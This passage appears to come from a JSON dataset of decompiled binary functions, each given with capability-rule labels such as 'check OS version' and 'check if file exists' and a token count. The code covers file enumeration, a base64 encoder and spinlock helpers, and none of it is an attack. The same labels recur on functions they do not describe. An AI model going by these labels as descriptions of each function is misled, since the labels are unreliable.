        "decompiled_code": "\nint32_t fcn.0001994c(ulong arg1, int64_t *arg2, ulong *arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int64_t *arg1_01;\n    int64_t *piVar3;\n    int64_t *arg1_02;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uStackX24;\n    int64_t iStackX32;\n    uint uVar10;\n    ulong in_stack_fffffffffffffce0;\n    uint uVar11;\n    uint uVar12;\n    uint32_t uVar13;\n    uchar auStack744 [16];\n    uchar auStack728 [16];\n    int64_t iStack712;\n    int64_t iStack704;\n    int64_t iStack696;\n    int64_t iStack688;\n    uint uStack680;\n    uint auStack672 [2];\n    ulong uStack664;\n    uchar *puStack656;\n    uint uStack648;\n    ulong uStack640;\n    ulong uStack632;\n    uchar auStack624 [24];\n    uchar auStack600 [536];\n    \n    uVar11 = in_stack_fffffffffffffce0 >> 0x20;\n    uVar6 = 0;\n    iStackX32 = 0;\n    if (arg3 == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else {\n        arg3[7] = 0;\n        arg1_00 = fcn.00030c98(0x268);\n        if (arg1_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.0006677c(arg1_00, 0, 0x268);\n            arg1_01 = fcn.00030c98(8);\n            if (arg1_01 == NULL) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                *arg1_01 = 0;\n                fcn.00066704(auStack728, arg1);\n                fcn.00031420(auStack600, 0x104, *arg3);\n                fcn.00066704(auStack624, auStack600);\n                uVar12 = 0;\n                puStack656 = auStack624;\n                uVar10 = 0;\n                auStack672[0] = 0x30;\n                uStack664 = 0;\n                uStack648 = 0x40;\n                uStack640 = 0;\n                uStack632 = 0;\n                iVar1 = fcn.0001e364(&iStackX32, 0x100001, auStack672, auStack744, 0, CONCAT44(uVar11, 0x80), 7, 1, 0x10\n                                     , 0, 0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0006679a(iStackX32, auStack744, &iStack712, 0x28, CONCAT44(uVar10, 4));\n                    if (iVar1 == 0) {\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack696 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack696 + -0x19db1ded53e8000;\n                        arg3[1] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack712 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack712 + -0x19db1ded53e8000;\n                        arg3[2] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack688 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack688 + -0x19db1ded53e8000;\n                        arg3[4] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iStack704 + -0x19db1ded53e8000) >> 0x40, 0\n                                      ) + iStack704 + -0x19db1ded53e8000;\n                        *(arg3 + 5) = uStack680;\n                        arg3[3] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                    }\n                    uVar13 = CONCAT31(uVar12 >> 8, 1);\n                    arg3[6] = 0;\n                    uStackX24 = 0;\n                    iVar2 = fcn.00066794(iStackX32, 0, 0, 0, auStack744, arg1_00, 0x268, 3, 1, auStack728, uVar13);\n                    if (iVar2 == 0) {\n                        iVar1 = 1;\n                        uVar9 = uVar6;\n                        do {\n                            uVar5 = uVar6;\n                            piVar3 = arg1_01;\n                            if (((((*(arg1_00 + 0x3c) & 0xfffffffe) != 2) ||\n                                 (iVar2 = fcn.0006678e(arg1_00 + 0x5e, 0x11a98, 1),  iVar2 != 0)) &&\n                                (((*(arg1_00 + 0x3c) & 0xfffffffe) != 4 ||\n                                 (iVar2 = fcn.0006678e(arg1_00 + 0x5e, 0x11a90, 2),  iVar2 != 0)))) &&\n                               (((arg3[6] = arg3[6] + *(arg1_00 + 0x28),  arg2 == NULL ||\n                                 ((*(arg1_00 + 0x38) & 0x10) != 0)) ||\n                                (iVar7 = *(arg1_00 + 0x18) + -0x19db1ded53e8000, \n                                iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7, \n                                *arg2 <= (iVar7 >> 0x17) - (iVar7 >> 0x3f))))) {\n                                uVar6 = iVar1 + 1 << 3;\n                                if (uVar6 == 0) {\n                                    fcn.00030d24(arg1_01);\n                                    piVar3 = NULL;\ncode_r0x00019ce9:\n                                    *(uVar9 + 8 + piVar3) = 0;\n                                    uVar5 = *(arg1_00 + 0x3c);\n                                    arg1_02 = fcn.00030c98(0x38);\n                                    if (arg1_02 == NULL) {\ncode_r0x00019d0b:\n                                        arg1_02 = NULL;\n                                    }\n                                    else {\n                                        fcn.0006677c(arg1_02, 0, 0x38);\n                                        iVar7 = (uVar5 >> 1) * 2;\n                                        iVar4 = fcn.00030c98(iVar7 + 2);\n                                        *arg1_02 = iVar4;\n                                        if (iVar4 == 0) {\n                                            fcn.00030d24(arg1_02);\n                                            goto code_r0x00019d0b;\n                                        }\n                                        fcn.0006670a(iVar4, arg1_00 + 0x5e, iVar7);\n                                        *(iVar7 + *arg1_02) = 0;\n                                    }\n                                    *(uVar9 + piVar3) = arg1_02;\n                                    arg1_01 = piVar3;\n                                    if (arg1_02 != NULL) {\n                                        iVar7 = *(arg1_00 + 0x18) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        arg1_02[1] = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 8) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x10) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 0x20) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x20) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        iVar7 = *(arg1_00 + 0x10) + -0x19db1ded53e8000;\n                                        iVar7 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar7) >> 0x40, 0) + iVar7\n                                        ;\n                                        *(*(uVar9 + piVar3) + 0x18) = (iVar7 >> 0x17) - (iVar7 >> 0x3f);\n                                        *(*(uVar9 + piVar3) + 0x28) = *(arg1_00 + 0x38);\n                                        if ((*(arg1_00 + 0x38) & 0x10) == 0) {\n                                            *(*(uVar9 + piVar3) + 0x30) = *(arg1_00 + 0x28);\n                                        }\n                                        else {\n                                            *(*(uVar9 + piVar3) + 0x30) = 0;\n                                        }\n                                        uVar9 = uVar9 + 8;\n                                        iVar1 = iVar1 + 1;\n                                        uVar5 = uStackX24;\n                                        goto code_r0x00019e4e;\n                                    }\n                                }\n                                else {\n                                    piVar3 = fcn.00030c98(uVar6);\n                                    if (piVar3 != NULL) {\n                                        uVar8 = iVar1 << 3;\n                                        if (uVar6 < iVar1 << 3) {\n                                            uVar8 = uVar6;\n                                        }\n                                        fcn.0006670a(piVar3, arg1_01, uVar8);\n                                        fcn.00030d24(arg1_01);\n                                        goto code_r0x00019ce9;\n                                    }\n                                }\n                                iVar1 = 0x21590004;\n                                goto code_r0x00019ed3;\n                            }\ncode_r0x00019e4e:\n                            uStackX24 = uVar5 + 1;\n                            uVar6 = uStackX24;\n                            uVar13 = uVar13 & 0xffffff00 | uStackX24 == 0;\n                            iVar2 = fcn.00066794(iStackX32, 0, 0, 0, auStack744, arg1_00, 0x268, 3, 1, auStack728, \n                                                 uVar13);\n                            arg1_01 = piVar3;\n                        } while (iVar2 == 0);\n                    }\n                    iVar1 = 0;\n                    if ((iVar2 == -0x7ffffffa) || (iVar1 = fcn.00066782(iVar2),  iVar1 == 0)) {\n                        arg3[7] = arg1_01;\n                    }\n                }\n                else {\n                    iVar1 = fcn.00066782(iVar1);\n                }\ncode_r0x00019ed3:\n                iVar7 = 0;\n                if ((arg1_01 != NULL) && (iVar1 != 0)) {\n                    iVar4 = *arg1_01;\n                    while (iVar4 != 0) {\n                        fcn.000198d0(iVar4);\n                        iVar7 = iVar7 + 1;\n                        iVar4 = arg1_01[iVar7];\n                    }\n                    fcn.00030d24(arg1_01);\n                }\n            }\n            fcn.00030d24(arg1_00);\n            if (iStackX32 != 0) {\n                fcn.000666f2();\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 2979
    },
    "000203ac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.000203ac(ulong arg1, uint64_t *arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    if (arg1 < 2) {\n        return 1;\n    }\n    if (3 < arg1) {\n        if (arg1 < 7) {\n            return 1;\n        }\n        if (8 < arg1) {\n            if (arg1 != 9) {\n                return 1;\n            }\n            if (arg3 != 8) {\n                return 0;\n            }\n            uVar1 = *arg2;\n            uVar2 = fcn.00030dc8(uVar1 >> 0x20);\n            uVar3 = fcn.00030dc8(uVar1 & 0xffffffff);\n            *arg2 = CONCAT44(uVar3, uVar2);\n            return 1;\n        }\n    }\n    if (arg3 == 4) {\n        uVar4 = fcn.00030dc8(*arg2);\n        *arg2 = uVar4;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "00020420": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00020420(ulong arg1)\n\n{\n    if ((1 < arg1) && ((arg1 < 4 || ((6 < arg1 && (arg1 < 10)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00020948": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00020948(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *arg1_00;\n    uchar auStack104 [8];\n    uint uStack96;\n    \n    if (((arg1 != 0) && (arg2 != 0)) && (arg1_00 = *(arg2 + 0x10),  arg1_00 != NULL)) {\n        do {\n            if (*arg1_00 == arg3) break;\n            arg1_00 = *(arg1_00 + 6);\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (arg4 != 0) {\n                iVar3 = fcn.00020914(arg2, arg3);\n                if (iVar3 == -1) {\n                    return;\n                }\n                iVar4 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), auStack104, 0x40, iVar3);\n                if (iVar4 != 0) {\n                    return;\n                }\n                uStack96 = 0xffff;\n                iVar3 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), auStack104, 0x40, iVar3);\n                if (iVar3 != 0) {\n                    return;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n                *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                if (arg4 != 2) {\n                    *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n                    (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n                }\n            }\n            iVar1 = *(arg1_00 + 4);\n            iVar2 = *(arg1_00 + 6);\n            if (iVar1 == 0) {\n                *(arg2 + 0x10) = iVar2;\n            }\n            else {\n                *(iVar1 + 0x18) = iVar2;\n            }\n            if (iVar2 == 0) {\n                *(arg2 + 0x18) = iVar1;\n            }\n            else {\n                *(iVar2 + 0x10) = iVar1;\n            }\n            if (*(arg1_00 + 8) == 0) {\n                *(arg1 + 0x40) = *(arg1_00 + 10);\n            }\n            else {\n                *(*(arg1_00 + 8) + 0x28) = *(arg1_00 + 10);\n            }\n            if (*(arg1_00 + 10) == 0) {\n                *(arg1 + 0x48) = *(arg1_00 + 8);\n            }\n            else {\n                *(*(arg1_00 + 10) + 0x20) = *(arg1_00 + 8);\n            }\n            fcn.00030d24(arg1_00);\n            if (arg4 != 2) {\n                fcn.00020788(arg2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 764
    },
    "00020f54": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.00020f54(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    \n    if (arg2 < 10) {\n        fcn.00030310(0x8e8c0);\n        arg1_00 = *(arg2 * 8 + 0x8e8d0);\n        while (arg1_00 != 0) {\n            iVar1 = fcn.00030538(arg1_00 + 0x88);\n            if (iVar1 != 0) {\n                if (arg3 != 2) {\n                    fcn.00030378(0x8e8c0);\n                }\n                *arg4 = arg1_00 + 0x88;\n                *(arg4 + 1) = arg3 == 2;\n                if (arg3 != 2) {\n                    iVar1 = *(arg1_00 + 0x2c);\n                    iVar2 = (**(*(arg1_00 + 0x58) + 0x28))(*(arg1_00 + 0x60), arg1_00 + 8, 0x2c);\n                    if (iVar2 != 0) {\n                        iVar1 = 3;\ncode_r0x00021044:\n                        fcn.000207cc(arg4);\n                        return iVar1;\n                    }\n                    if (*(arg1_00 + 0x2c) != iVar1) {\n                        iVar1 = fcn.00020d30(arg1_00);\n                        if (iVar1 != 0) goto code_r0x00021044;\n                    }\n                }\n                if (arg1 != NULL) {\n                    *arg1 = arg1_00;\n                }\n                return 0;\n            }\n            fcn.00030378(0x8e8c0);\n            (**0x115e8)(0, 0);\n            fcn.00030310(0x8e8c0);\n            arg1_00 = *(arg2 * 8 + 0x8e8d0);\n        }\n        fcn.00030378(0x8e8c0);\n    }\n    return 1;\n}\n",
        "token_count": 499
    },
    "0002e820": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.0002e820(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint64_t *puVar4;\n    \n    uVar3 = 0;\n    puVar4 = 0x7eeb8;\n    do {\n        uVar1 = *puVar4;\n        if (((uVar1 != 0) && (uVar1 = *(uVar1 + 0x38),  uVar1 != 0)) && (uVar1 = *(uVar1 + 8),  uVar1 != 0)) {\n            for (uVar2 = *(uVar1 + 0x18); uVar2 != 0; uVar2 = *(uVar2 + 0x18)) {\n                if (*arg1 == uVar2) {\n                    *arg1 = uVar1;\n                    return CONCAT71(uVar1 >> 8, 1);\n                }\n                uVar1 = uVar2;\n            }\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 2);\n    return uVar1 & 0xffffffffffffff00;\n}\n",
        "token_count": 280
    },
    "0002ef10": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.0002ef10(ulong noname_0, uchar *arg2)\n\n{\n    int32_t iVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong *puVar2;\n    ulong uVar3;\n    ulong in_stack_fffffffffffffc80;\n    uint uVar4;\n    uint uVar5;\n    ulong in_stack_fffffffffffffc88;\n    uint32_t uVar6;\n    uint uVar7;\n    uint auStack840 [2];\n    ulong uStack832;\n    uchar *puStack824;\n    uint uStack816;\n    ulong uStack808;\n    ulong uStack800;\n    ulong uStack792;\n    uchar auStack784 [8];\n    int64_t iStack776;\n    uchar auStack768 [24];\n    uchar auStack744 [96];\n    uchar auStack648 [96];\n    uchar auStack552 [518];\n    ushort uStack34;\n    \n    uVar4 = in_stack_fffffffffffffc80 >> 0x20;\n    uVar6 = in_stack_fffffffffffffc88 >> 0x20;\n    fcn.000292e4(auStack648, 0x52);\n    fcn.00029294(auStack744, 0x52);\n    fcn.00066722(auStack552, 0x104, 0x140e0, auStack648, auStack744);\n    uStack34 = 0;\n    fcn.00066704(auStack768, auStack552);\n    puStack824 = auStack768;\n    auStack840[0] = 0x30;\n    uStack832 = 0;\n    uStack816 = 0x40;\n    uStack808 = 0;\n    uStack800 = 0;\n    fcn.000293d4(&uStackX24);\n    uVar7 = 0;\n    puVar2 = &uStackX24;\n    uVar3 = CONCAT44(uVar4, 0x80);\n    iVar1 = fcn.0001e364(0x7ee70, 3, auStack840, auStack784, puVar2, uVar3, uVar6 << 0x20, 3, 0x868, 0, 0);\n    uVar4 = puVar2 >> 0x20;\n    uVar5 = uVar3 >> 0x20;\n    if (iVar1 == 0) {\n        *(*0x69080 + 0x20) = *0x7ee70;\n        if ((iStack776 == 2) || (iStack776 == 3)) {\n            uStack792 = uStackX24;\n            uVar3 = CONCAT44(uVar4, 0x14);\n            iVar1 = fcn.0006672e(*0x7ee70, auStack784, &uStack792, 8, uVar3);\n            uVar4 = uVar3 >> 0x20;\n            if (iVar1 != 0) goto code_r0x0002f159;\n            *arg2 = 1;\n        }\n        else {\n            *arg2 = 0;\n        }\n        auStack840[0] = 0x30;\n        uStack832 = 0;\n        uStack816 = 0;\n        puStack824 = NULL;\n        uStack808 = 0;\n        uStack800 = 0;\n        iVar1 = fcn.00066872(0x7ee88, 6, auStack840, 0, CONCAT44(uVar4, 4), CONCAT44(uVar5, 0x18000000), *0x7ee70);\n        if (iVar1 == 0) {\n            uStackX32 = 0;\n            iVar1 = fcn.0006686c(*0x7ee88, 0xffffffffffffffff, 0x7ee98, 0, 0, 0, &uStackX32, 2, 0, CONCAT44(uVar7, 4));\n            if (iVar1 == 0) {\n                *0x7eea8 = uStackX32;\n                return 0;\n            }\n        }\n    }\ncode_r0x0002f159:\n    if (*0x7ee98 != 0) {\n        fcn.00066866(0xffffffffffffffff);\n        *0x7ee98 = 0;\n    }\n    if (*0x7ee88 != 0) {\n        fcn.000666f2();\n        *0x7ee88 = 0;\n    }\n    fcn.000666f2(*0x7ee70);\n    *0x7ee70 = 0;\n    return iVar1;\n}\n",
        "token_count": 1025
    },
    "0002ff70": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0002ff70(int16_t *arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (*arg1 == 2) {\n        arg1 = arg1 + 2;\n        uVar1 = 2;\n    }\n    else {\n        if (*arg1 != 0x17) {\n            return 0;\n        }\n        arg1 = arg1 + 4;\n        uVar1 = 0x17;\n    }\n    uVar1 = fcn.0002fd5c(uVar1, arg1, arg2, arg3);\n    return uVar1;\n}\n",
        "token_count": 139
    },
    "0002ffac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0002ffac(int64_t arg1, uint *arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint8_t auStackX16 [16];\n    uint uStackX32;\n    char acStack120 [26];\n    char acStack94 [26];\n    char acStack68 [10];\n    uchar uStack58;\n    uchar uStack57;\n    \n    iVar10 = 0;\n    bVar2 = false;\n    iVar6 = 0;\n    pcVar8 = acStack94;\n    do {\n        cVar3 = iVar6;\n        pcVar8[-0x1a] = cVar3 + 'A';\n        iVar6 = iVar6 + 1;\n        *pcVar8 = cVar3 + 'a';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar6 < 0x1a);\n    iVar6 = 0;\n    pcVar8 = acStack68;\n    do {\n        cVar3 = iVar6;\n        iVar6 = iVar6 + 1;\n        *pcVar8 = cVar3 + '0';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar6 < 10);\n    iVar7 = 0;\n    uStack58 = 0x2b;\n    uStack57 = 0x2f;\n    puVar9 = arg2;\n    do {\n        iVar6 = 0;\n        auStackX16[2] = 0;\n        auStackX16[1] = 0;\n        auStackX16[0] = 0;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar7 + arg1;\n            iVar7 = iVar7 + 1;\n            iVar5 = iVar4 + 1;\n            auStackX16[iVar4] = *puVar1;\n            iVar6 = iVar6 + 1;\n            if (iVar7 == arg3) {\n                bVar2 = true;\n                break;\n            }\n            iVar4 = iVar5;\n        } while (iVar5 < 3);\n        if (0 < iVar6) {\n            uStackX32._0_3_ =\n                 CONCAT12(acStack120[(auStackX16[1] & 0xf) << 2 | auStackX16[2] >> 6], \n                          CONCAT11(acStack120[(auStackX16[0] & 3) << 4 | auStackX16[1] >> 4], \n                                   acStack120[auStackX16[0] >> 2]));\n            uStackX32 = CONCAT13(acStack120[auStackX16[2] & 0x3f], uStackX32);\n            if (iVar6 < 3) {\n                cVar3 = acStack120[(auStackX16[1] & 0xf) << 2 | auStackX16[2] >> 6];\n                if (iVar6 < 2) {\n                    cVar3 = '=';\n                }\n                uStackX32._0_3_ =\n                     CONCAT12(cVar3, CONCAT11(acStack120[(auStackX16[0] & 3) << 4 | auStackX16[1] >> 4], \n                                              acStack120[auStackX16[0] >> 2]));\n                uStackX32 = CONCAT13(0x3d, uStackX32);\n            }\n        }\n        iVar10 = iVar10 + 4;\n        *puVar9 = uStackX32;\n        puVar9 = puVar9 + 1;\n        if (bVar2) {\n            *(iVar10 + arg2) = 0;\n            return iVar10;\n        }\n    } while( true );\n}\n",
        "token_count": 886
    },
    "000324dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.000324dc(uint64_t *arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        while (!bVar5) {\n            LOCK();\n            *arg1 = *arg1 - 1;\n            uVar3 = fcn.000667b8();\n            uVar4 = 0;\n            if (uVar3 != (uVar3 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar3 = fcn.000667b8();\n                } while (uVar4 < uVar3 % 10);\n            }\n            LOCK();\n            *arg1 = *arg1 + 1;\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        }\n    }\n    else if (arg2 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        while (!bVar5) {\n            uVar3 = fcn.000667b8();\n            uVar4 = 0;\n            if (uVar3 != (uVar3 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar3 = fcn.000667b8();\n                } while (uVar4 < uVar3 % 10);\n            }\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        }\n        do {\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * *arg1;\n        } while (uVar2 != 0);\n    }\n    else if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n    }\n    return;\n}\n",
        "token_count": 600
    },
    "000325fc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.000325fc(uint64_t *arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    \n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n        if (uVar2 == 0) {\n            return 1;\n        }\n        LOCK();\n        *arg1 = *arg1 - 1;\n    }\n    else if (arg2 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * (*puVar1 ^ 1);\n        if (uVar2 == 0) {\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * *arg1;\n            if (uVar2 == 0) {\n                return 1;\n            }\n            LOCK();\n            arg1[1] = arg1[1] - 1;\n        }\n    }\n    else if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "00032650": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.00032650(uint64_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    uint64_t *puVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    iVar3 = (*_fcn.000115f8)();\n    *arg2 = iVar3;\n    if (iVar3 < 2) {\n        iVar3 = (**0x11200)();\n    }\n    if (arg3 == 0) {\n        LOCK();\n        *arg1 = *arg1 + 1;\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n        iVar3 = !bVar5 * *puVar1;\n        while (!bVar5) {\n            LOCK();\n            *arg1 = *arg1 - 1;\n            uVar2 = fcn.000667b8();\n            uVar4 = 0;\n            if (uVar2 != (uVar2 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar2 = fcn.000667b8();\n                } while (uVar4 < uVar2 % 10);\n            }\n            LOCK();\n            *arg1 = *arg1 + 1;\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * *puVar1;\n            iVar3 = !bVar5 * *puVar1;\n        }\n    }\n    else if (arg3 == 1) {\n        LOCK();\n        puVar1 = arg1 + 1;\n        bVar5 = *puVar1 == 0;\n        *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        while (!bVar5) {\n            uVar2 = fcn.000667b8();\n            uVar4 = 0;\n            if (uVar2 != (uVar2 / 10) * 10) {\n                do {\n                    uVar4 = uVar4 + 1;\n                    uVar2 = fcn.000667b8();\n                } while (uVar4 < uVar2 % 10);\n            }\n            LOCK();\n            puVar1 = arg1 + 1;\n            bVar5 = *puVar1 == 0;\n            *puVar1 = *puVar1 ^ bVar5 * (*puVar1 ^ 1);\n        }\n        do {\n            LOCK();\n            bVar5 = *arg1 == 0;\n            *arg1 = *arg1 ^ bVar5 * *arg1;\n            iVar3 = !bVar5 * *arg1;\n        } while (!bVar5);\n    }\n    else if (arg3 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 689
    },
    "000326c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
